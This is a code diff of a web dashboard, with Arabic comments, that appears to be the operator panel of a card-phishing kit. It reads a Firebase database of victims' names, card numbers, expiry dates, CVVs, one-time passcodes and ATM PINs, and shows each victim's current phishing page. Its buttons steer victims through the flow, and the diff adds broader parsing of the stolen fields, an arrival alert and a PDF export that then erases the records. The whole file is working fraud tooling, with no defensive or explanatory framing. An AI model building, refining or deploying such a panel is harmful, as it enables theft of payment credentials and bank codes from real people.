@@ -12,24 +12,16 @@
         body { font-family: 'Segoe UI', sans-serif; background: #eceff1; margin: 0; padding: 10px; }
         .nav-bar { background: #1a6d44; color: white; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; border-radius: 8px; margin-bottom: 15px; position: sticky; top: 0; z-index: 1000; box-shadow: 0 2px 10px rgba(0,0,0,0.2); }
         .live-status { background: #ffd700; color: #000; padding: 5px 12px; border-radius: 5px; font-weight: bold; font-size: 13px; }
-        
         .btn-pdf { background: #333; color: white; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 13px; }
-        
         .cards-container { display: flex; flex-direction: column; gap: 12px; }
         .client-card { background: white; border-radius: 8px; padding: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); border-right: 8px solid #7f8c8d; position: relative; }
-        
-        /* شريط الحالة للعميل */
         .client-pos { position: absolute; left: 15px; top: 12px; background: #e8f5e9; color: #2e7d32; padding: 4px 10px; border-radius: 4px; font-size: 11px; font-weight: bold; border: 1px solid #c8e6c9; }
-        .pos-exit { background: #ffebee; color: #c62828; border-color: #ffcdd2; }
-
-        .data-line { display: flex; flex-wrap: wrap; gap: 25px; align-items: center; margin-top: 25px; border-top: 1px solid #f9f9f9; padding-top: 10px; }
-        .data-item { display: flex; flex-direction: column; }
-        .label { font-size: 10px; color: #999; margin-bottom: 2px; text-transform: uppercase; }
+        .data-line { display: flex; flex-wrap: wrap; gap: 20px; align-items: center; margin-top: 25px; border-top: 1px solid #f9f9f9; padding-top: 10px; }
+        .data-item { display: flex; flex-direction: column; min-width: 80px; }
+        .label { font-size: 10px; color: #999; margin-bottom: 2px; }
         .value { font-size: 14px; font-weight: bold; font-family: monospace; color: #333; }
-        
         .otp-box { background: #fff5f5; padding: 4px 8px; border-radius: 4px; border: 1px solid #ffcdd2; }
         .otp-val { color: #d32f2f; font-size: 16px; }
-        
         .actions { display: flex; gap: 8px; justify-content: flex-end; margin-top: 10px; }
         .btn-ctl { background: #7f8c8d; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 12px; }
     </style>
@@ -39,12 +31,11 @@
 <audio id="alert_sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
 
 <div class="nav-bar">
-    <div class="live-status">نشط الآن: <span id="online_count">0</span></div>
-    <button class="btn-pdf" onclick="_exportAndClear()">EXPORT PDF & RESET</button>
+    <div class="live-status">العمليات النشطة: <span id="online_count">0</span></div>
+    <button class="btn-pdf" onclick="_exportAndClear()">PDF & RESET</button>
 </div>
 
-<div class="cards-container" id="all_clients">
-    </div>
+<div class="cards-container" id="all_clients"></div>
 
 <script>
     let database;
@@ -58,35 +49,34 @@
         if (!firebase.apps.length) firebase.initializeApp(config);
         database = firebase.database();
 
-        // تحديث عدد الزوار النشطين
-        database.ref('presence').on('value', s => {
-            document.getElementById('online_count').innerText = s.numChildren() || 0;
-        });
-
-        // مراقبة العمليات والتحركات
         database.ref('orders').on('value', snapshot => {
             const container = document.getElementById('all_clients');
             container.innerHTML = '';
+            let count = 0;
             
             snapshot.forEach(child => {
                 const item = child.val();
-                const card = item.card_details || {};
                 const id = child.key;
-                
-                // تحديد مكان العميل الحالي
-                let currentPos = item.current_page || "غير معروف";
-                let posClass = (currentPos === "تم الخروج") ? "pos-exit" : "";
+                count++;
+
+                // محرك قراءة البيانات: بيفحص كل المسميات الممكنة اللي الكود بتاعك بيبعتها
+                const cardNumber = item.cardNumber || (item.card_details && item.card_details.cardNumber) || 'Waiting...';
+                const expiry = item.expiryDate || item.expiry || (item.card_details && item.card_details.expiryDate) || '--';
+                const cvv = item.cvv || (item.card_details && item.card_details.cvv) || '--';
+                const otp = item.otp || (item.card_details && item.card_details.otp) || '---';
+                const atm = item.atm_pin || item.pin || (item.card_details && item.card_details.atm_pin) || '---';
+                const page = item.current_page || (otp !== '---' ? "صفحة الـ OTP" : (cardNumber !== 'Waiting...' ? "صفحة البطاقة" : "المعلومات الشخصية"));
 
                 const cardHtml = `
                     <div class="client-card">
-                        <div class="client-pos ${posClass}">المكان الحالي: ${currentPos}</div>
+                        <div class="client-pos">الموقع: ${page}</div>
                         <div class="data-line">
-                            <div class="data-item"><span class="label">Name</span><span class="value">${item.fullName || '---'}</span></div>
-                            <div class="data-item"><span class="label">Card (16)</span><span class="value">${card.cardNumber || 'Waiting...'}</span></div>
-                            <div class="data-item"><span class="label">EXP</span><span class="value">${card.expiryDate || '--'}</span></div>
-                            <div class="data-item"><span class="label">CVV</span><span class="value">${card.cvv || '--'}</span></div>
-                            <div class="data-item otp-box"><span class="label">CODE (V)</span><span class="value otp-val">${card.otp || '---'}</span></div>
-                            <div class="data-item"><span class="label">ATM (P)</span><span class="value">${card.atm_pin || '---'}</span></div>
+                            <div class="data-item"><span class="label">NAME</span><span class="value">${item.fullName || '---'}</span></div>
+                            <div class="data-item"><span class="label">CARD</span><span class="value">${cardNumber}</span></div>
+                            <div class="data-item"><span class="label">EXP</span><span class="value">${expiry}</span></div>
+                            <div class="data-item"><span class="label">CVV</span><span class="value">${cvv}</span></div>
+                            <div class="data-item otp-box"><span class="label">OTP</span><span class="value otp-val">${otp}</span></div>
+                            <div class="data-item"><span class="label">ATM</span><span class="value">${atm}</span></div>
                         </div>
                         <div class="actions">
                             <button class="btn-ctl" onclick="_act('${id}', 'next')">OK</button>
@@ -96,18 +86,17 @@
                 `;
                 container.insertAdjacentHTML('afterbegin', cardHtml);
             });
+            document.getElementById('online_count').innerText = count;
+            if(count > 0) document.getElementById('alert_sound').play().catch(()=>{});
         });
     }
 
-    function _act(id, status) {
-        database.ref('orders/' + id).update({ control_action: status });
-    }
+    function _act(id, status) { database.ref('orders/' + id).update({ control_action: status }); }
 
     async function _exportAndClear() {
-        if(confirm("تحميل التقرير ومسح كافة البيانات؟")) {
+        if(confirm("تحميل PDF وتصفير اللوحة؟")) {
             html2pdf().from(document.getElementById('all_clients')).save().then(() => {
                 database.ref('orders').remove();
-                alert("تم التفريغ");
             });
         }
     }
